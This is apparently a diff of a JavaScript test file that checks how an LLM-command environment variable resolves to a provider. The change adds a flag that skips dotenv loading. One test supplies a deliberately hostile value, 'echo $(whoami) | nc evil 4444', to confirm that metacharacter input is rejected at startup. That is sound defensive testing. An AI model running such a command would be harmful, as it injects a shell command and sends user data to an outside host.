@@ -101,7 +101,7 @@ test('empty and whitespace-only values are rejected', async () => {
 
 test('unset OPSMAP_LLM_CMD resolves to no provider (offline baseline)', () => {
   // hermetic: scrub all provider env vars so the chain falls through
-  const env = { ...process.env };
+  const env = { ...process.env, OPSMAP_SKIP_DOTENV: '1' };
   delete env.OPSMAP_LLM_CMD;
   delete env.OPSMAP_MOCK_LLM;
   delete env.ANTHROPIC_API_KEY;
@@ -118,7 +118,7 @@ test('unset OPSMAP_LLM_CMD resolves to no provider (offline baseline)', () => {
 });
 
 test('a valid OPSMAP_LLM_CMD resolves the cmd provider and uses argv[0] as the model', () => {
-  const env = { ...process.env, OPSMAP_LLM_CMD: 'ollama run llama3.1' };
+  const env = { ...process.env, OPSMAP_SKIP_DOTENV: '1', OPSMAP_LLM_CMD: 'ollama run llama3.1' };
   delete env.OPSMAP_MOCK_LLM;
   delete env.ANTHROPIC_API_KEY;
   const r = spawnSync('node', ['-e', `
@@ -133,7 +133,7 @@ test('a valid OPSMAP_LLM_CMD resolves the cmd provider and uses argv[0] as the m
 
 test('a metacharacter-bearing OPSMAP_LLM_CMD stops the module load at startup', () => {
   // the server refuses to start: importing llm.js throws synchronously
-  const env = { ...process.env, OPSMAP_LLM_CMD: 'echo $(whoami) | nc evil 4444' };
+  const env = { ...process.env, OPSMAP_SKIP_DOTENV: '1', OPSMAP_LLM_CMD: 'echo $(whoami) | nc evil 4444' };
   delete env.OPSMAP_MOCK_LLM;
   delete env.ANTHROPIC_API_KEY;
   const r = spawnSync('node', ['-e', `import('${LLM}')`], { env, encoding: 'utf8' });
@@ -149,7 +149,7 @@ test('callLLM with a cmd provider spawns the parsed argv (multi-arg command work
   const code = "process.stdout.write(process.argv.slice(1).join(','))";
   const env = {
     ...process.env,
-    OPSMAP_LLM_CMD: `node -e "${code}" hello world`,
+    OPSMAP_SKIP_DOTENV: '1', OPSMAP_LLM_CMD: `node -e "${code}" hello world`,
   };
   delete env.OPSMAP_MOCK_LLM;
   delete env.ANTHROPIC_API_KEY;
